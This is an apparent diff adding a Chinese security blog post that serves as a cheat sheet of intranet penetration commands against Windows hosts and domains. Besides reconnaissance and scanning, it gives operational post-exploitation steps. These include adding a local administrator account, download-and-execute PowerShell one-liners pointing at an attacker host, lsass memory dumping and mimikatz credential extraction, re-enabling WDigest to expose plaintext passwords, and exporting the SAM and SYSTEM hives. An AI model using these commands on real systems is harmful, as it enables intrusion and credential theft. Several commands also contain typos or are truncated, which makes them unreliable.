@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/1655090890230.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/1655090890230.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="内网信息收集">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-信息收集命令">
+<meta property="og:url" content="http://example.com/2022/10/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+<meta property="og:site_name" content="Security">
+<meta property="og:description" content="内网信息收集">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-10-04T15:45:42.551Z">
+<meta property="article:modified_time" content="2022-10-27T11:20:37.021Z">
+<meta property="article:author" content="l3ife">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/10/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网渗透-信息收集命令 | Security</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Security</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">8</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">13</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l3ife">
+      <meta itemprop="description" content="谁想当安全混子呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Security">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网渗透-信息收集命令
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-10-04 23:45:42" itemprop="dateCreated datePublished" datetime="2022-10-04T23:45:42+08:00">2022-10-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-27 19:20:37" itemprop="dateModified" datetime="2022-10-27T19:20:37+08:00">2022-10-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">内网信息收集</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h1><pre><code>whoami /all                                                          #查看当前用户、权限
+ipconfig /all                                                        #查看网络配置
+route print                                                          #查看主机路由信息
+systeminfo || systeminfo | findstr /B /C: “OS Name”  /C “OS Version” #查看操作系统信息
+netstat -ano                                                         #查看端口连接信息
+net session                                                          #查看当前会话列表
+net share                                                            #查看当前网络共享信息
+net use                                                              #查看已连接的网络共享
+tasklist  || tasklist /SVC                                           #查看当前进程信息
+wmic process get Name, ProcessId,ExecutablePath  #查询主机进程，并过滤进程的路径、名称和PID 
+wmic process where Name=” msdtc.exe” get ExecutablePath # 查询指定进程的路径信息
+
+wmic service get Caption,Name,PathName,StartName,State               #查询所有服务            
+wmic service where Name=”backdoor” get Caption, PathName,State       #查询指定服务信息
+schtasks /query /v /fo list                                          #查询计划任务信息
+wmic startup get Caption,Command,Location,User                       #查询主机上所有的自启程序信息，并过滤出程序名称、执行的命令、程序的路径、所属用户                                       
+wmic qfe get Caption,CSName,Description,HotFixID,InstalledOn         #查看主机安装的补丁列表，并过滤出补丁连接，名称，描述，补丁编号以及安装时间
+wmic product get Caption,Version                                     #查看应用安装信息
+net user || net user &lt;username&gt;     # 查看指定用户信息 || net localgroup administrators #查看本地管理员组
+net user &lt;username&gt; &lt;password&gt; /add #创建本地用户 || net localgroup administrators &lt;username&gt; /add #将用户加入本地管理员组
+query user                                                           #查看登录用户
+</code></pre>
+<h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><pre><code>1. 判断是否为域环境 
+    net config workstation #查看工作站环境，包括当前计算机名、用户名、系统版本、工作站、登录域
+    
+2. 查看域用户
+    net user /domain  #查看所有域用户
+    net user &lt;username&gt; /domain #查看指定域用户详细信息
+    wmic useraccount get Caption,Domain,Description
+    所有与域相关的查询都需要通过域控制器来实现，并经过Kerberos协议来认证
+    
+3. 查看域用户组信息
+    net group /domain #列出域内所有用户组
+    net group “Domain Admins” /domain #查看域管理员组，包括所有的域管理员用户
+    net group “Domain Computers” /domain #查看域成员主机组，得到域内所有客户端主机
+    net group “Domain Users” /domain #查看域用户组，包括所有域用户
+    net group “Enterprise Admins” /domain #查询企业系统管理员组，得到所有的企业系统管理员用户，该组是通用组，其中的成员对域林所有域拥有完全控制权，Domain Admins只是全局组，只对本域拥有完全控制权限
+    
+4. 查看域内密码策略
+    net accounts /domain
+    
+5. 查看域控制器列表
+    net group “Domain Controllers” /domain #查询域控制器组，得到所有域控制器的主机名
+    nltest /DCLIST:hack-my.com # “hack-my.com” 为域名
+    
+6. 查看主域控制器
+    net time /domain
+  
+7. 定位域控制器
+    ping DC-1.hack-my.com
+
+    也可以通过NDS服务器地址定位域控
+
+8.	查看域信任关系
+    
+    nltest /domain_trusts
+</code></pre>
+<h1 id="资源探测"><a href="#资源探测" class="headerlink" title="资源探测"></a>资源探测</h1><h2 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h2><p><strong>1.基于ICMP扫描主机</strong></p>
+<p>可以通过ICMP循环对整个网端的每个IP地址执行ping</p>
+<pre><code>for /L %I in (1,1,254) D0 @ping -w 1 -n 1 10.10.10.%I | finstr “TTL”
+</code></pre>
+<p><strong>2.基于NetBios（网络基本输入&#x2F;输出系统）协议发现存活主机</strong></p>
+<p>NetBios再TCP&#x2F;IP模型包括在应用层服务中，让不同计算机运行的不同程序可以在局域网相互连接和共享数据，实际利用时向局域网的每个IP地址发送NetBIOS状态查询，可以获得主机名、MAC地址等信息。</p>
+<p>可以利用NBTScan程序，是一款扫描Windows网络的NetBIOS名称的程序，可以对给定IP范围的IP地址发送NetBIOS状态查询</p>
+<p>上传nbtscan.exe到目标主机</p>
+<pre><code>nbtscan.exe 10.10.10.1/24
+</code></pre>
+<p><strong>3.基于UDP发现存活主机</strong></p>
+<p>将空的UDP报文发送到目标主机的特定端口，如果主机端口关闭，UDP探测就会得一个ICMP端口无法到达的回应报文，说明主机正在运行，到达开放端口，大部分服务仅仅忽略空报文不做回应</p>
+<p>Unicornscan为Kali的信息收集工具</p>
+<pre><code>unicornscan -mU 10.10.10.0/24
+</code></pre>
+<p><strong>4.基于ARP发现存活主机</strong></p>
+<p>解析网络层地址来找数据链路层地址的网络传输协议，主机发送信息，会广播到局域网所有主机，返回信息后就加入ARP缓存，节约资源</p>
+<p>1.ARP-Scan利用</p>
+<pre><code>arp-scan.exe -t 10.10.10.0/24
+</code></pre>
+<p>2.Powershell利用</p>
+<p>Empire渗透框架的Invoke-ARPScan.psl脚本</p>
+<p>先将脚本导入执行</p>
+<pre><code>Import-Module .\Invoke-ARPScan.ps1
+
+Invoke-ARPScan -CIDR 10.10.10.0/24
+</code></pre>
+<p>也可以将脚本代码托管在服务器上，通过PowerShell远程加载运行</p>
+<pre><code>powershell.exe -exec bypass -Commannd “IEX(New-Object Net.WebClient).DownloadString(’http://your-ip:port/Invoke-ARPScan.ps1’)”
+</code></pre>
+<p><strong>基于SMB协议发现存活主机</strong></p>
+<p>SMB又称CIFS协议，CIFS使用NetBIOS或TCP发送，可用139或445端口</p>
+<p>CrackMapExec工具，在kali linux上安装，能枚举登录用户、枚举SMB服务列表、执行WINRM攻击等功能</p>
+<pre><code>crackmapexec smb 10.10.10.0/24
+</code></pre>
+<h2 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h2><p><strong>1.Telnet探测端口</strong></p>
+<pre><code>telnet &lt;IP&gt; &lt;port&gt;
+</code></pre>
+<p><strong>2.Nmap端口扫描</strong></p>
+<pre><code>nmap -p 80,88,135,139,443,8080,3306,3389 10.10.10.11
+
+nmap -sS -p 1-65535 10.10.10.11 #扫描目标主机开放的全部端口
+
+nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #扫描并获取目标主机指定端口的服务版本
+</code></pre>
+<p><strong>3.PowerShell端口扫描</strong></p>
+<p>NiShang是基于PowerShell的渗透测试专用框架，Scan模块也有Invoke-PortsCan.ps1脚本</p>
+<pre><code>Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.20 -ResolveHost -ScanPort
+
+powershell.exe -exec bypass -Command “IEX(New-Object Net.WebClient).DownloadString(”http://your-ip:port/Invoke-portscan.ps1”);Invoke-PortScan -StartAddress  10.10.10.1 EndAddress -10.10.10.20 -ResolveHost -ScanPort -Port 80,88,135,139,443,8080,3306,3389”
+</code></pre>
+<h2 id="获取Banner"><a href="#获取Banner" class="headerlink" title="获取Banner"></a>获取Banner</h2><p><strong>1.NetCat获取</strong></p>
+<pre><code>nc -nv &lt;IP&gt; &lt;port&gt;
+
+nc -nv 10.10.10.1521
+</code></pre>
+<p><strong>2.Telnet获取</strong></p>
+<pre><code>telnet &lt;ip&gt; &lt;port&gt;
+</code></pre>
+<p><strong>3.nmap获取</strong></p>
+<p>指定脚本 “—script&#x3D;banner”</p>
+<pre><code>nmap —script=banner -p &lt;ports&gt; &lt;IP&gt;
+</code></pre>
+<h1 id="用户凭据获取"><a href="#用户凭据获取" class="headerlink" title="用户凭据获取"></a>用户凭据获取</h1><h2 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h2><p>所有本机用户的用户名、密码哈希值等信息都存储在SAM文件，位于系统的%SystemRoot%\System32\Config目录。lsass.exe</p>
+<p><strong>Mimikatz获取用户凭证</strong></p>
+<p>1.<strong>在线读取lsass进程内存</strong></p>
+<p>将mimikatz.exe上传到目标主机，执行命令</p>
+<pre><code>mimikataz.exe “privilege::debug” “sekurlsa::logonpasswords full” exit #privilege::debug,用于提升至Debug Privilege权限；sekurlsa::logon passwords 用于导出用户凭据
+</code></pre>
+<p>2.<strong>离线读取lsass内存文件</strong></p>
+<p>将lsass.exe的进程内存转储，将内存文件导出本地后，使用Mimikatz进行离线读取。</p>
+<p>用于转储工具，如OutMinidump.ps1、Procdump、SharpDump，或者手动加载系统自带的comsvcs.dll实现内存转储</p>
+<p>在目标主机上传Procdump程序</p>
+<pre><code>procdump.exe -accepteula -ma lsasse.exe lsass.dmp
+
+mimikataz.exe  “sekurlsa::minidump lsass.dmp” “sekurlsa::logonpasswords full” exit \#“sekurlsa::minidump lsass.dmp” 用于加载内存文件；sekurlsa::logonpasswords,用于导出用户凭据
+</code></pre>
+<p>为了防止用户的明文密码在内存西俄楼，在Windows Server 2012及以上版本默认关闭 Wdigest功能，可以尝试修改注册表开启</p>
+<p>#开启WDigest</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 1 /f
+</code></pre>
+<p>#关闭WDigest</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 0 /f
+</code></pre>
+<p><strong>3.在线读取本地SAM文件</strong></p>
+<p>将mimikatz.exe上传到目标主机</p>
+<pre><code>mimikatz.exe “privilege::debug” “token::elevate” “lsadump::sam” exit
+    #privilege::debug 提升到DebugPrivilege权限
+    #token::elevate 提升到SYSTEM权限
+    #lsadump::sam提升到本地SAM文件
+</code></pre>
+<p><strong>4.离线读取本地SAM文件</strong></p>
+<p>将SAM文件导出，使用Mimikatz加载并读取其中的用户登录凭据</p>
+<p>首先在目标主机导出SAM和SYSTEM两文件，这两文件是锁住的，需要工具导出，使用PowerSploit项目的Invoke-NinjaCopy.ps1</p>
+<pre><code>Invoke-NinjaCopy -Path “C:\Windows\System32\config\SAM” -LocalDestination C:\Temp\SAM
+
+Invoke-NinjaCopy -Path “C:\Windows\System32\config\SYSTEM” -LocalDestination C:\Temp\SYSTEM
+</code></pre>
+<p>也可在管理员下执行命令，通过保存注册表的命令导出</p>
+<pre><code>reg save HKLM\SAM sam.hive
+
+reg save HKLM\SYSTE
+</code></pre>
+<p>复制到本地，用Mimikatz加载并</p>
+<pre><code>mimikatz.exe “lsadump::sam /sam:sam.hive /system:system.hive” exit
+</code></pre>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>l3ife
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/10/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="内网渗透-信息收集命令">http://example.com/2022/10/04/内网信息收集/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/04/%E6%97%A5%E8%AE%B0-%E6%AF%8F%E6%97%A5%E4%B8%80%E8%AE%B0%E4%BD%8F/" rel="prev" title="猪猪侠大佬">
+      <i class="fa fa-chevron-left"></i> 猪猪侠大佬
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/05/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7/" rel="next" title="内网代理转发工具">
+      内网代理转发工具 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">本机信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F"><span class="nav-number">2.</span> <span class="nav-text">域</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.</span> <span class="nav-text">资源探测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">3.1.</span> <span class="nav-text">扫描存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.2.</span> <span class="nav-text">内网端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Banner"><span class="nav-number">3.3.</span> <span class="nav-text">获取Banner</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="nav-number">4.</span> <span class="nav-text">用户凭据获取</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E5%8D%95%E6%9C%BA%E5%AF%86%E7%A0%81%E5%92%8C%E5%93%88%E5%B8%8C%E5%80%BC"><span class="nav-number">4.1.</span> <span class="nav-text">获取域内单机密码和哈希值</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">l3ife</p>
+  <div class="site-description" itemprop="description">谁想当安全混子呢</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+	  
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">l3ife</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
